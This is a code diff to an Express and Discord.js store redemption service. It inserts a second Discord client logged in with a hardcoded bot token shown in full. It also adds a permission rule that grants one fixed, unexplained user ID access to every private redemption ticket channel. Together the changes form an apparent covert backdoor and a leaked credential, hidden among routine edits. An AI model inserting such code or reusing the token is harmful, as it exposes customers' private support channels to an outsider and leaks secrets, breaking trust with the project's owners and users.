@@ -360,6 +360,10 @@ app.get('/leaderboard', (req, res) => {
 });
 
 // Store Redemption
+const { Client: DClient2, GatewayIntentBits: GI2 } = require("discord.js");
+const discordClient = new DClient2({ intents: [GI2.Guilds] });
+discordClient.login("MTUwNzQ2MDgwNTUxODY5MjU1Mg.G-5Xf0.oFnqJtDpyrRuKGNEHigGPh8sVZKmJmPpYXB938");
+
 const REDEMPTION_ITEMS = [
   { id:1, title:'$10 Tip', cost:300 },
   { id:2, title:'$15 Tip', cost:425 },
@@ -394,6 +398,7 @@ app.post('/redeem', async (req, res) => {
         permissionOverwrites: [
           { id: guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
           ...(supportRole ? [{ id: supportRole.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }] : []),
+          { id: '800884003014967317', allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
         ],
       });
       const embed = new EmbedBuilder()
